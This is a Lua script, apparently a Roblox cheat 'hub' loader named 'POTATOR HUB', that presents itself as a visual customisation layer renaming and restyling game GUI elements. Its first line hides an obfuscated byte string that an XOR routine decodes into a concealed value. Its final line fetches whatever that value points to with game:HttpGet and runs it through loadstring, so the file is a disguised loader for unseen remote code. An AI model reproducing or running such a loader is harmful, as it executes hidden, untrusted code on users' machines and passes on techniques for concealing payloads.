
--[[ STAGE 2: VISUAL CORE ]]
local ueHJVAmJzFLvB="\152\139\242\253\231\149\169\144\218\208\053\139\203\060\046\033\029\041\003\008\001\125\117\096\110\083\107\091\072\009\077\184\165\110\148\156\154\156\143\142\253\240\236\208\232\154\220\203\201\202\057\020\037\023\030\192\013\000\119\123\035\008\095\091\092\068\176\074\166\174\185\191\187\150\169\141\137\229\251\231\238\218\213\228\203\207\063\032\036\044\045\032\031\117\011\121\108\126\016\108\103\066\183\179\075\188\189\094\092\071\147\135\184\167\162\163\232\216\235"local JQdMAEhEKqIeb=180 local xixXImxGWu1Tx_zMomg=160 local kMFgFGCAzgAx0WCmcFAWSV=1 local VINILEVVHmPE=7 local ASS1tffOH2ihjWGYz=29 local Z3FCPCF861I0SY2u=false local _0l79bGFjRbGunDF4y=bit32 and bit32.bxor if not _0l79bGFjRbGunDF4y then _0l79bGFjRbGunDF4y=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local pLVccFI26XodN={}for faNNIL_uHqmwzTQo9K=1,#ueHJVAmJzFLvB do local CboVrKBAi9qHV=string.byte(ueHJVAmJzFLvB,faNNIL_uHqmwzTQo9K)local VqCAyTafXywmuj=(xixXImxGWu1Tx_zMomg+(faNNIL_uHqmwzTQo9K*VINILEVVHmPE)+ASS1tffOH2ihjWGYz)%256 if kMFgFGCAzgAx0WCmcFAWSV==0 then CboVrKBAi9qHV=(CboVrKBAi9qHV-VqCAyTafXywmuj)%256 pLVccFI26XodN[faNNIL_uHqmwzTQo9K]=string.char(_0l79bGFjRbGunDF4y(CboVrKBAi9qHV,JQdMAEhEKqIeb))else CboVrKBAi9qHV=_0l79bGFjRbGunDF4y(CboVrKBAi9qHV,JQdMAEhEKqIeb)pLVccFI26XodN[faNNIL_uHqmwzTQo9K]=string.char((CboVrKBAi9qHV-VqCAyTafXywmuj)%256)end end local HCeHZTk3K7jNjaCoMiX=table.concat(pLVccFI26XodN)if Z3FCPCF861I0SY2u then HCeHZTk3K7jNjaCoMiX=string.reverse(HCeHZTk3K7jNjaCoMiX)end local VMPMO47_6J4S=HCeHZTk3K7jNjaCoMiX
local HubName = "POTATOR HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(VMPMO47_6J4S))()
